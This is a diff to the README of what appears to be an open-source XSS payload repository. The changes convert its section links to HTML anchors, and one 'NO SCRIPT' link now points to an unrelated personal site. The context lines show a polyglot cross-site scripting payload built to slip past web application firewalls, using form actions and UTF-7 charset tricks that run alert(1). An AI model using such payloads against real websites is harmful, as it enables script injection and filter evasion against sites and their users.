@@ -8,7 +8,7 @@ This is an open source repo. Anyone can contribute. :beers: <br/>
 	[![Coffee](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoff.ee/R0X4R)
 
 ## Bypass WAF
-[NO SCRIPT TAGS](D4rkXSS/noscript.txt "NO SCRIPT TAGS")<br/>
+<a href="https://eshansingh.in/">NO SCRIPT</a><br/>
 <li>For Example:</li>
 
 ```
@@ -76,10 +76,10 @@ This is an open source repo. Anyone can contribute. :beers: <br/>
 <div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div><div id="4">0?<script>
 ```
 ## Search Engine XSS
-[seXSS](D4rkXSS/seXSS.md "seXSS")<br/>
+<a href="https://github.com/R0X4R/D4rkXSS/blob/master/seXSS.md">seXSS</a><br/>
 
 ## Misc Payloads
-[Misc](D4rkXSS/Misc.md "Misc")<br/>
+<a href="https://github.com/R0X4R/D4rkXSS/blob/master/Misc.md">Misc</a><br/>
 
 ## Basic Payloads
 [Basic](D4rkXSS/basic.txt "Basic")<br/>
